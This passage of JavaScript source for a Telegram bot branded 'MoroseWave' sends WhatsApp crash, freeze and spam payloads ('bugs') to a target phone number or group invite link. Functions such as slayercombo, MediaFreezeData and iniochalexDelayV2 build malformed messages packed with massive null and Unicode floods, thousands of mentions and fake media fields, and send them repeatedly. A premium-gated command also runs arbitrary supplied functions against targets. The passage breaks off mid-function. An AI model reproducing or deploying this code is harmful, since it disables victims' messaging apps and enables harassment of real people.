        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 10; i++) {
    await topsbuldog(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V31.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});

bot.command("Xspamv5", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Format: /Xspamv5 62xxx`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  if (ctx.from.id != ownerID && !isPremGroup(ctx.chat.id)) {
    return ctx.reply("Grup belum terdaftar sebagai PREMIUM.");
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `
<pre><code class="language-javascript">
[ MOROSEWAVE | V31.0 ]

Target: ${q}
Status: Process
</code></pre>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 1; i++) {
    await MediaFreezeData(sock, target);
    await sleep(500);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<pre><code class="language-javascript">
[ MOROSEWAVE | V31.0 ]

Target: ${q}
Status: Success
</code></pre>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "CEK TARGET", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "5334998226636390258" }
      ]]
    }
  });
});


//CASE BUG GROUP
bot.command("morogroupv1", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
    let input = ctx.message.text.split(" ").slice(1).join(" ");
    if (!input) return ctx.reply("☇ Format: /morogroup https://chat.whatsapp.com/xxxxx");
    
    let inviteCode = input;
    const match = input.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
    if (match) inviteCode = match[1];

    await ctx.reply(`✅ Sedang memproses group...`);

    try {
        const groupInfo = await sock.groupGetInviteInfo(inviteCode).catch(() => null);
        if (!groupInfo) {
            return ctx.reply(`❌ Invite link tidak valid atau expired!`);
        }

        const groupJid = groupInfo.id;

        const isBotInGroup = groupInfo.participants?.some(p => p.id === sock.user.id);
        if (!isBotInGroup) {
            await sock.groupAcceptInvite(inviteCode).catch(() => null);
            await ctx.reply(`✅ Berhasil join group: ${groupInfo.subject}`);
        } else {
            await ctx.reply(`ℹ️ Bot sudah join di group: ${groupInfo.subject}`);
        }

        for (let i = 0; i < 1; i++) {
            try {
                await BanGroupNew(sock, groupJid);
            } catch (err) {
                console.log(`❌ Gagal kirim H4ters: ${err.message}`);
            }
        }

        await ctx.reply(`✅ Sukses mengirim Bug ke group: ${groupInfo.subject}`);

    } catch (error) {
        console.error('[XGROUP] Error:', error);
        await ctx.reply(`❌ Gagal: ${error.message}`);
    }
});

bot.command("morogroupv2", checkWhatsAppConnection, checkCooldown, checkCommandEnabled, async (ctx) => {
    let input = ctx.message.text.split(" ").slice(1).join(" ");
    if (!input) return ctx.reply("☇ Format: /morogroupv2 https://chat.whatsapp.com/xxxxx");
    
    let inviteCode = input;
    const match = input.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/);
    if (match) inviteCode = match[1];

    await ctx.reply(`✅ Sedang memproses group...`);

    try {
        const groupInfo = await sock.groupGetInviteInfo(inviteCode).catch(() => null);
        if (!groupInfo) {
            return ctx.reply(`❌ Invite link tidak valid atau expired!`);
        }

        const groupJid = groupInfo.id;

        const isBotInGroup = groupInfo.participants?.some(p => p.id === sock.user.id);
        if (!isBotInGroup) {
            await sock.groupAcceptInvite(inviteCode).catch(() => null);
            await ctx.reply(`✅ Berhasil join group: ${groupInfo.subject}`);
        } else {
            await ctx.reply(`ℹ️ Bot sudah join di group: ${groupInfo.subject}`);
        }

        for (let i = 0; i < 15; i++) {
            try {
                await BlankMaklo(sock, groupJid);
            } catch (err) {
                console.log(`❌ Gagal kirim H4ters: ${err.message}`);
            }
        }

        await ctx.reply(`✅ Sukses mengirim Bug ke group: ${groupInfo.subject}`);

    } catch (error) {
        console.error('[XGROUP] Error:', error);
        await ctx.reply(`❌ Gagal: ${error.message}`);
    }
});

//END CASE BUG

bot.command("testfunction", checkWhatsAppConnection, checkPremium, checkCooldown, async (ctx) => {
    try {
      const args = ctx.message.text.split(" ")
      if (args.length < 3)
        return ctx.reply("🪧 ☇ Format: /testfunction 62××× 5 (reply function)")

      const q = args[1]
      const jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 500))
      if (isNaN(jumlah) || jumlah <= 0)
        return ctx.reply("❌ ☇ Jumlah harus angka")

      const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net"
      if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.text)
        return ctx.reply("❌ ☇ Reply dengan function")

      const processMsg = await ctx.telegram.sendPhoto(
        ctx.chat.id,
        { url: thumbnailUrl },
        {
          caption: `<pre><code class="language-javascript">⟡━⟢ MoroseWave ⟣━⟡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Process
╘═——————————————═⬡</code></pre>`,
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "🔍 Cek Target", url: `https://wa.me/${q}` }]
            ]
          }
        }
      )
      const processMessageId = processMsg.message_id

      const safeSock = createSafeSock(sock)
      const funcCode = ctx.message.reply_to_message.text
      const match = funcCode.match(/async function\s+(\w+)/)
      if (!match) return ctx.reply("❌ ☇ Function tidak valid")
      const funcName = match[1]

      const sandbox = {
        console,
        Buffer,
        sock: safeSock,
        target,
        sleep,
        generateWAMessageFromContent,
        generateForwardMessageContent,
        generateWAMessage,
        prepareWAMessageMedia,
        proto,
        jidDecode,
        areJidsSameUser
      }
      const context = vm.createContext(sandbox)

      const wrapper = `${funcCode}\n${funcName}`
      const fn = vm.runInContext(wrapper, context)

      for (let i = 0; i < jumlah; i++) {
        try {
          const arity = fn.length
          if (arity === 1) {
            await fn(target)
          } else if (arity === 2) {
            await fn(safeSock, target)
          } else {
            await fn(safeSock, target, true)
          }
        } catch (err) {}
        await sleep(200)
      }

      const finalText = `<pre><code class="language-javascript">⟡━⟢ MoroseWave ⟣━⟡
⌑ Target: ${q}
⌑ Type: Unknown Function
⌑ Status: Success
╘═——————————————═⬡</code></pre>`
      try {
        await ctx.telegram.editMessageCaption(
          ctx.chat.id,
          processMessageId,
          undefined,
          finalText,
          {
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      } catch (e) {
        await ctx.replyWithPhoto(
          { url: thumbnailUrl },
          {
            caption: finalText,
            parse_mode: "HTML",
            reply_markup: {
              inline_keyboard: [
                [{ text: "CEK TARGET", url: `https://wa.me/${q}` }]
              ]
            }
          }
        )
      }
    } catch (err) {}
  }
)
//FUNCTION BUG NUMBER TARGET//
//fc click
async function iwaktempek(sock, target) {
  await sock.relayMessage(target, {
    interactiveMessage: {
      body: { text: "MoroseWave Is Here.." },
      nativeFlowMessage: {
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: JSON.stringify({
              title: "ြ".repeat(50000),
              sections: [
                {
                  title: "A".repeat(5000),
                  rows: [
                    { title: "X".repeat(5000), id: "1" },
                    { title: "Y".repeat(5000), id: "2" },
                    { title: "Z".repeat(5000), id: "3" },
                  ],
                },
                {
                  title: "B".repeat(5000),
                  rows: [
                    { title: "M".repeat(5000), id: "4" },
                    { title: "N".repeat(5000), id: "5" },
                    { title: "O".repeat(5000), id: "6" },
                  ],
                },
                {
                  title: "C".repeat(5000),
                  rows: [
                    { title: "P".repeat(5000), id: "7" },
                    { title: "Q".repeat(5000), id: "8" },
                    { title: "R".repeat(5000), id: "9" },
                  ],
                },
                {
                  title: "D".repeat(5000),
                  rows: [
                    { title: "S".repeat(5000), id: "10" },
                    { title: "T".repeat(5000), id: "11" },
                    { title: "U".repeat(5000), id: "12" },
                  ],
                },
                {
                  title: "E".repeat(5000),
                  rows: [
                    { title: "V".repeat(5000), id: "13" },
                    { title: "W".repeat(5000), id: "14" },
                    { title: "I".repeat(5000), id: "15" },
                  ],
                },
              ],
            }),
          },
          {
            name: "order_status",
            buttonParamsJson: JSON.stringify({
              order_id: "MWMK_" + Date.now(),
              status: "pending",
              merchant_name: "moro",
              item_name: "morose",
              quantity: 999,
              total_amount: 999999,
              currency: "IDR",
              delivery_address: "\u0000".repeat(5000),
              notes: "\u0000".repeat(5000)
            })
          }
        ],
      },
      contextInfo: {
        mentionedJid: Array(1000).fill(target),
        forwardingScore: 9999,
        isForwarded: true,
      },
    },
  }, { participant: true });

  await sock.relayMessage(target, {
    documentMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
      mimetype: "application/pdf",
      fileSha256: "jLQrXn8TtEFsd/y5qF6UHW/4OE8RYcJ7wumBn5R1iJ8=",
      fileLength: 0,
      pageCount: 0,
      mediaKey: "xSUWP0Wl/A0EMyAFyeCoPauXx+Qwb0xyPQLGDdFtM4U=",
      fileName: "\u0000".repeat(7500),
      fileEncSha256: "R33GE5FZJfMXeV757T2tmuU0kIdtqjXBIFOi97Ahafc=",
      directPath: "/v/t62.7119-24/31863614_1446690129642423_4284129982526158568_n.enc?ccb=11-4&oh=01_Q5AaINokOPcndUoCQ5xDt9-QdH29VAwZlXi8SfD9ZJzy1Bg_&oe=67B59463&_nc_sid=5e03e0",
      mediaKeyTimestamp: 1737369406,
      caption: "Official WA",
      title: "Official WA",
      mentionedJid: Array(1000).fill(target),
      contextInfo: {
        mentionedJid: Array(1000).fill(target),
        forwardingScore: 9999,
        isForwarded: true
      }
    }
  }, { participant: true });

  await sock.relayMessage(target, {
    interactiveMessage: {
      nativeFlowMessage: {
        messageParamsJson: "ꦾ".repeat(9000) + "ꦾ".repeat(9000),
        buttons: [
          {
            name: "single_select",
            buttonParamsJson: ""
          },
          {
            name: "call_permission_request",
            buttonParamsJson: ""
          }
        ]
      }
    }
  }, { participant: target });

  await sock.relayMessage("status@broadcast", {
    extendedTextMessage: {
      text: "",
      contextInfo: {
        participant: target,
        mentionedJid: [target]
      }
    }
  }, {
    messageId: Date.now().toString(),
    statusJidList: [target],
    additionalNodes: [{
      tag: "biz",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
      }]
    }]
  });
}
//beku
async function MediaFreezeData(sock, target) {
  const data = {
    groupStatusMessageV2: {
      message: {
        messageContextInfo: {},
        mediaMetadata: {},
        interactiveMessage: {
          body: {
            text: "moro"
          },
          nativeFlowMessage: {
            buttons: "\x10".repeat(500000)
          }
        }
      }
    }
  };

  await sock.relayMessage(target, data, {
    participant: target
  });
}
//delay visib
async function slayercombo(sock, target) {
  
  const sleep = (ms) => new Promise(r => setTimeout(r, ms));
  const rnd = (n) => Math.random().toString(36).slice(2, n);
  const jidList = (n) => Array.from({ length: n }, () => 
    `1${Math.floor(Math.random() * 9000000)}@s.whatsapp.net`
  );

  // ── VECTOR 1: UNICODE NULL FLOOD ──────────────────────────
  const vectorUnicode = async () => {
    const nullBomb = '\u0000'.repeat(50000);
    const reverseBomb = '\u202E'.repeat(10000);
    const zeroWidth = '\u200B\u200C\u200D\uFEFF'.repeat(15000);
    const payload = nullBomb + reverseBomb + zeroWidth;
    
    return {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: payload },
            nativeFlowMessage: {
              buttons: [
                { name: 'quick_reply', buttonParamsJson: JSON.stringify({ display_text: payload.slice(0, 5000) }) },
                { name: 'cta_call', buttonParamsJson: payload.slice(0, 5000) },
                { name: 'cta_copy', buttonParamsJson: payload.slice(0, 5000) },
                { name: 'mpm', buttonParamsJson: payload.slice(0, 5000) }
              ]
            },
            contextInfo: {
              mentionedJid: jidList(2000),
              forwardingScore: 999999,
              isForwarded: true
            }
          }
        }
      }
    };
  };

  // ── VECTOR 2: WA PROTO INTERACTIVE BOMB ───────────────────
  const vectorProtoInteractive = async () => {
    const buttonStack = Array.from({ length: 200 }, (_, i) => ({
      name: ['quick_reply', 'cta_call', 'cta_copy', 'cta_url', 'mpm', 
             'single_select', 'call_permission_request', 'booking_confirmation'][i % 8],
      buttonParamsJson: JSON.stringify({
        display_text: '𝕏'.repeat(500) + rnd(500),
        status: true,
        id: rnd(1000),
        url: 'https://' + rnd(100) + '.com'
      })
    }));

    return {
      interactiveMessage: {
        body: { text: '𝕾𝖑𝖆𝖞𝖊𝖗'.repeat(2000) },
        footer: { text: '\u0000'.repeat(10000) },
        header: {
          title: '𝕾𝖑𝖆𝖞𝖊𝖗𝕮𝖔𝖒𝖇𝖔'.repeat(1000),
          hasMediaAttachment: false
        },
        nativeFlowMessage: {
          buttons: buttonStack,
          messageParamsJson: '{"flow":"' + rnd(10000) + '"}'
        },
        contextInfo: {
          mentionedJid: jidList(3000),
          quotedMessage: {
            conversation: '\u0000'.repeat(5000)
          }
        }
      }
    };
  };

  // ── VECTOR 3: CAROUSEL BOMB ───────────────────────────────
  const vectorCarousel = async () => {
    const cards = Array.from({ length: 30 }, () => ({
      header: {
        title: '\u0000'.repeat(3000),
        hasMediaAttachment: false,
        locationMessage: {
          degreesLatitude: 999999999,
          degreesLongitude: 999999999,
          name: '𝕾𝖑𝖆𝖞𝖊𝖗'
        }
      },
      body: {
        text: '\u202E'.repeat(5000) + '\u200B'.repeat(5000)
      },
      nativeFlowMessage: {
        buttons: Array.from({ length: 50 }, () => ({
          name: 'quick_reply',
          buttonParamsJson: JSON.stringify({ display_text: '𝕏'.repeat(500) })
        })),
        messageParamsJson: '{}'
      }
    }));

    return {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: { text: '𝕾𝖑𝖆𝖞𝖊𝖗' + rnd(5000) },
            carouselMessage: { cards },
            contextInfo: { mentionedJid: jidList(1500) }
          }
        }
      }
    };
  };

  // ── VECTOR 4: POLL BOMB ───────────────────────────────────
  const vectorPoll = async () => {
    return {
      pollCreationMessage: {
        name: '𝕾𝖑𝖆𝖞𝖊𝖗𝕮𝖔𝖒𝖇𝖔'.repeat(500) + '\u0000'.repeat(10000),
        options: Array.from({ length: 100 }, () => ({
          optionName: '\u0000'.repeat(500) + rnd(500)
        })),
        selectableOptionsCount: 50,
        contextInfo: {
          mentionedJid: jidList(2000),
          forwardingScore: 999999
        }
      }
    };
  };

  // ── VECTOR 5: STICKER BOMB ────────────────────────────────
  const vectorSticker = async () => {
    const sticker = {
      url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/" + rnd(200) + 
           "?ccb=9-4&oh=" + rnd(50) + "&oe=" + Date.now(),
      fileSha256: rnd(44),
      fileEncSha256: rnd(44),
      mediaKey: rnd(44),
      mimetype: "image/webp",
      height: 99999,
      width: 99999,
      directPath: "/o1/v/t62.7118-24/f2/m231/" + rnd(200),
      fileLength: 99999999,
      mediaKeyTimestamp: Date.now().toString(),
      isAnimated: true,
      stickerSentTs: Date.now(),
      isAvatar: false,
      isAiSticker: false,
      isLottie: true,
      contextInfo: {
        participant: target,
        mentionedJid: jidList(1500),
        remoteJid: "X",
        stanzaId: rnd(20),
        quotedMessage: {
          paymentInviteMessage: {
            serviceType: 3,
            expiryTimestamp: Date.now() + 1814400000
          }
        }
      }
    };
    return {
      viewOnceMessage: { message: { stickerMessage: sticker } }
    };
  };

  // ── VECTOR 6: CONTACT VCARD BOMB ──────────────────────────
  const vectorVcard = async () => {
    const vcard = `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:𝕾𝖑𝖆𝖞𝖊𝖗${
      '\u0000'.repeat(5000)
    }\nTEL;type=Ponsel;waid=1:1\nX-WA-BIZ-DESCRIPTION:${
      '\u202E'.repeat(5000)
    }\nX-WA-BIZ-NAME:𝕾𝖑𝖆𝖞𝖊𝖗\nEND:VCARD`;

    return {
      viewOnceMessage: {
        message: {
          interactiveResponseMessage: {
            body: { text: '\u0000'.repeat(5000), format: "DEFAULT" },
            nativeFlowResponseMessage: {
              name: "address_message",
              paramsJson: '\r'.repeat(900000),
              version: 3
            }
          },
          contextInfo: {
            mentionedJid: jidList(2000),
            quotedMessage: {
              key: {
                remoteJid: "status@broadcast",
                participant: "0@s.whatsapp.net",
                fromMe: false
              },
              message: {
                contactMessage: { displayName: "𝕾𝖑𝖆𝖞𝖊𝖗", vcard }
              }
            }
          }
        }
      }
    };
  };

  // ── VECTOR 7: LOCATION PROTO BOMB ─────────────────────────
  const vectorLocation = async () => {
    return {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: '\u0000'.repeat(10000),
              hasMediaAttachment: true,
              locationMessage: {
                degreesLatitude: 9999999999,
                degreesLongitude: 9999999999,
                name: '𝕾𝖑𝖆𝖞𝖊𝖗𝕮𝖔𝖒𝖇𝖔',
                address: '\u202E'.repeat(3000)
              }
            },
            body: { text: '𝕾𝖑𝖆𝖞𝖊𝖗' + '\u200B'.repeat(10000) },
            nativeFlowMessage: {
              buttons: [{ name: 'send_location', buttonParamsJson: '{}' }]
            },
            contextInfo: { mentionedJid: jidList(2500) }
          }
        }
      }
    };
  };

  // ── VECTOR 8: PROTOCOL MESSAGE ────────────────────────────
  const vectorProtocol = async () => {
    return {
      protocolMessage: {
        type: 25,
        key: {
          remoteJid: target,
          fromMe: false,
          id: rnd(20)
        }
      },
      contextInfo: {
        forwardingScore: 99999,
        isForwarded: true,
        forwardedAiBotMessageInfo: {
          botName: 'Meta AI',
          botJid: '0@s.whatsapp.net',
          creatorName: '𝕾𝖑𝖆𝖞𝖊𝖗'
        }
      }
    };
  };

  // ── VECTOR 9: NEWSLETTER INVITE BOMB ──────────────────────
  const vectorNewsletter = async () => {
    return {
      newsletterAdminInviteMessage: {
        newsletterJid: "1@newsletter",
        newsletterName: '𝕾𝖑𝖆𝖞𝖊𝖗'.repeat(5000) + '\u0000'.repeat(5000),
        caption: '\u202E'.repeat(10000) + '\u0000'.repeat(10000),
        inviteExpiration: "9999999999999"
      }
    };
  };

  // ── VECTOR 10: REQUEST PAYMENT BOMB ───────────────────────
  const vectorPayment = async () => {
    return {
      viewOnceMessage: {
        message: {
          requestPaymentMessage: {
            body: { text: '𝕾𝖑𝖆𝖞𝖊𝖗' + '\u0000'.repeat(5000), format: 'DEFAULT' },
            nativeFlowResponseMessage: {
              name: "review_and_pay",
              paramsJson: JSON.stringify({
                currency: "IDR",
                total_amount: { value: 999999999, offset: 100 },
                reference_id: rnd(20),
                type: "physical-goods",
                order: {
                  status: "pending",
                  description: '\u0000'.repeat(5000),
                  subtotal: { value: 999999999, offset: 100 },
                  order_type: "ORDER",
                  items: Array.from({ length: 50 }, () => ({
                    name: '\u202E'.repeat(500),
                    amount: { value: 999999, offset: 100 },
                    quantity: 999
                  }))
                }
              }),
              version: 3
            }
          }
        }
      }
    };
  };
  
  const vectors = [
    { name: 'UNICODE', fn: vectorUnicode },
    { name: 'PROTO', fn: vectorProtoInteractive },
    { name: 'CAROUSEL', fn: vectorCarousel },
    { name: 'POLL', fn: vectorPoll },
    { name: 'STICKER', fn: vectorSticker },
    { name: 'VCARD', fn: vectorVcard },
    { name: 'LOCATION', fn: vectorLocation },
    { name: 'PROTOCOL', fn: vectorProtocol },
    { name: 'NEWSLETTER', fn: vectorNewsletter },
    { name: 'PAYMENT', fn: vectorPayment }
  ];

  const LOOP = 5;         // 5 putaran combo
  const DELAY = 800;      // 800ms antar payload

  for (let round = 0; round < LOOP; round++) {
    for (const v of vectors) {
      try {
        const payload = await v.fn();
        await sock.relayMessage(target, payload, {
          messageId: rnd(20),
          participant: { jid: target }
        });
        console.log(`[R${round+1}] ✅ ${v.name}`);
      } catch (e) {
        console.log(`[R${round+1}] ❌ ${v.name}: ${e.message}`);
      }
      await sleep(DELAY);
    }
  }

  // ── FINAL BURST: STATUS BROADCAST MENTION ─────────────────
  try {
    const finalMsg = await vectorProtoInteractive();
    await sock.relayMessage("status@broadcast", finalMsg, {
      messageId: rnd(20),
      statusJidList: [target],
      additionalNodes: [{
        tag: "meta",
        attrs: { is_status_mention: "true" },
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
        }]
      }]
    });
    console.log('✅ FINAL BURST done');
  } catch (e) {
    console.log('❌ FINAL BURST:', e.message);
  }

  return { status: 'SLAYERCOMBO DONE', target };
}
//delay invis v1
async function iniochalexDelayV2(sock, target) {
    const LexMsg = {
        interactiveMessage: {
            nativeFlowMessage: {
                buttons: [{
                    name: "payment_info",
                    buttonParamsJson: '{"currency":"IDR","total_amount":{"value":0,"offset":100},"reference_id":"\u0000' + Date.now() + '","type":"physical-goods","order":{"status":"pending","subtotal":{"value":0,"offset":100},"order_type":"ORDER","items":[{"name":"' + '\u0000'.repeat(7500) + '","amount":{"value":0,"offset":100},"quantity":0,"sale_amount":{"value":0,"offset":100}}]},"payment_settings":[{"type":"pix_static_code","pix_static_code":{"merchant_name":"\u0000","key":"' + '\u0000'.repeat(7500) + '","key_type":"CPF"}}],"share_payment_status":false}'
                }]
            }
        }
    };

    const Nanas = {
        viewOnceMessage: {
            message: {
                videoMessage: {
                    mimetype: "video/mp4",
                    fileLength: "17381601",
                    title: "moro",
                    fileName: " done bos " + "ꦽ".repeat(75000),
                    fileSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    fileEncSha256: "Jch1ImUydhA2vcB5auK8Dsc1jFHRN9ykhr2x5sr3X5c=",
                    mediaKey: "s4SdSzN3zwaZNv1+jcXtAQdCc8AIm879E9+CwdN8VfI2",
                    directPath: "/v/t62.7119-24/fake.enc",
                    mediaKeyTimestamp: "1767975195",
                    url: "https://mmg.whatsapp.net/d/fake.enc",
                    caption: "ꦾ".repeat(7000) + "ꦽ".repeat(7500)
                }
            }
        }
    };

    const Muda = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    body: {
                        text: " moro " + "ꦾ".repeat(7500)
                    },
                    contextInfo: {
                        stanzaId: "metawai_id",
                        forwardingScore: 999,
                        participant: target,
                        mentionedJid: Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                    }
                }
            }
        }
    };

    const stickers = {
        stickerMessage: {
            url: 'https://mmg.whatsapp.net/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0&mms3=true',
            fileSha256: 'lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=',
            fileEncSha256: "lOzzPjzVDfakRkXD9ud+N/JGUHVsmn37eqDk0UijQdA=",
            mediaKey: Buffer.alloc(32, '').toString('base64'),
            mimetype: "image/webp",
            height: -1,
            width: 5000,
            directPath: '/m1/v/t24/An_qcbaV8YTP-HtiB1VFAie8c-VqF4bBnMHWKN--GFd6T2GW-pQwLHQe4K4eDKCS1Fv9DZCa6RXMDsLeabNqy8RoTIekx2LtJCM-iUtOu_sdK90zdCEu1l8Wwqj3KAHrNRd1?ccb=10-5&oh=01_Q5Aa4AEbsVLrEjUg9wGPpN5mT_DeeyZp0Obyl7Cp7X5CHZ4mSA&oe=69D77DE6&_nc_sid=5e03e0',
            fileLength: null,
            mediaKeyTimestamp: 1710000000,
            firstFrameLength: 999,
            firstFrameSidecar: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            isAnimated: true,
            pngThumbnail: Buffer.from([99,88,77,66,55,44,33,22,11,0]),
            contextInfo: {
                mentionedJid: [
                    "0@s.whatsapp.net",
                    ...Array.from({ length: 1999 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
                ],
                interactiveAnnotations: [{
                    polygonVertices: [
                        { x: 0.1, y: 0.1 },
                        { x: 0.9, y: 0.1 },
                        { x: 0.9, y: 0.9 },
                        { x: 0.1, y: 0.9 }
                    ],
                    location: {
                        latitude: -6.2088,
                        longitude: 106.8456,
                        name: `moro`,
                    }
                }]
            },
            stickerSentTs: 1710000000,
            isAvatar: true,
            isAiSticker: true,
            isLottie: true,
            accessibilityLabel: "\u0000".repeat(9000),
            mediaKeyDomain: null
        }
    };

    const msg = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            caption: "moro",
                            fileSha256: "umQsdlmP4w9dL35/1yb2Wy5x6ypLvSXUy3r7veQ/rNU=",
                            fileLength: "109951162777600",
                            height: -9999,
                            width: 9999,
                            mediaKey: "pbSAJfuBxe4QBnJO34YFyM1EX4ZABBJsmW6rhvT+5+I=",
                            fileEncSha256: "8frUJ7Tt5d1EXOSWiP/9CBdN4fP2gPV6WPE0sN/IaF4=",
                            directPath: "/v/t62.7118-24/613381757_981708741479682_6415817420190586389_n.enc?ccb=11-4&oh=01_Q5Aa4AGbFJc4Yn7y_Y2gO_4l-ZyX1pyKJJpcCA_a-Wra2rY9SA&oe=69E62DD0&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1774107894",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHR0Jdi1hZV1hYjX2Xe5t7l33gsJycsOD/2c7Z////////////////CABEIAEgASAMBIgACEQEDEQH/xAAsAAACAwEBAAAAAAAAAAAAAAAABAIDBQEGAQEAAAAAAAAAAAAAAAAAAAAA/9oADAMBAAIQAxAAAADs6unZ2+aFh/SINqdLCYSpYVKXczcHeKUGr56zGNgaDMfrkKJRqNSqkK6GqjWFw2MvVwxefqbzzDetQJykmZZwN7KAS4BCYFYBYAf/xAAmEAACAgICAgICAgMAAAAAAAAAAAABAgADBBESIQUxE0EQIhVRFDJS/9oACAEBAAE/AMZx8C6BOjHNh2FYLMahbcieZzONYpT84PlOKCi0dSyxa9LqIgLgkghjKwyWWUoQBuGtQG5sd77ImGUVbmXrrqZFr22HcowL7hvWhKfFy/xj8eSiVs708XHa9SmsF+J+hL8T43589bjltDl2NzJ+RrErrMxvGog5v2ZUyceh6lj8VY+v6ldqvXLslVyyn0ejHL41kvJrX5LDt/oRG+Zi1nUutejJDfUGUciv46tciJUl+OCbWEttpyGPK4CZF6Y1YFL8pWWtvUnskyvhcnxuNv8AUFjWW7vmPWtzitCSvszyZqNhrXrgJiPwLkWFSB1C92WKyDsp7luG23ts/QQHdJQAe/crc1uCJjX/ACD9Tpx6lVdOhtTzMtv/AMBgoHuZdy3Wl1ErPFgSOopUNyrfUf5LG/d4QtSnrZldDPx69mFUotRFPcw6BShutP7N6nljuxGgx2sr5IjbleFmH1SZX4jKPtZ/DP8Adgn8SmxzumXirTim2pvUx2L5CFjvuZFyktYf9Elu7q3sJ+9zG7xqihUfrNjiQ1qw34y7DXiPm4Ce7Y3lcEelYzL8ul1DVJVMRwl6kiZALoKgd/bS0fHUR/UF1oGg7AQW2f8AZhJJjqi8eLb67/NTcXBn/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAgEBPwBP/8QAFBEBAAAAAAAAAAAAAAAAAAAAQP/aAAgBAwEBPwBP/9k=",
                            viewOnce: true,
                            scansSidecar: "ruEDZByywdU2+wxwAOMMI9TaQpJ84ehIk67v1KJjC+JGXu9u7ta4fw==",
                            scanLengths: [6677, 48757, 32501, 42353],
                            midQualityFileSha256: "qjGQcaOKUiN+pMKBMxAEeONhJR5VDFsu+iGxQ1LfmNY="
                        },
                        hasMediaAttachment: null
                    },
                    body: {
                        text: "\u0000".repeat(1000)
                    },
                    contextInfo: {
                        remoteJid: "status@broadcast",
                        participant: target,
                        isBuldo: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from({ length: 1000 * 40 }, () => "1" + Math.floor(Math.random() * 5000000) + "@s.whatsapp.net")
                        ],
                        groupMentions: [],
                        entryPointConversionSource: "non_contact",
                        entryPointConversionApp: "whatsapp",
                        entryPointConversionDelaySeconds: 467593,
                        quotedMessage: {
                            documentMessage: {
                                url: "https://example.com/file.zip",
                                mimetype: "application/zip",
                                caption: "y",
                                fileName: "e",
                                fileLength: 99999,
                                vCards: true
                            }
                        }
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "ြ".repeat(9000)
                    }
                }
            }
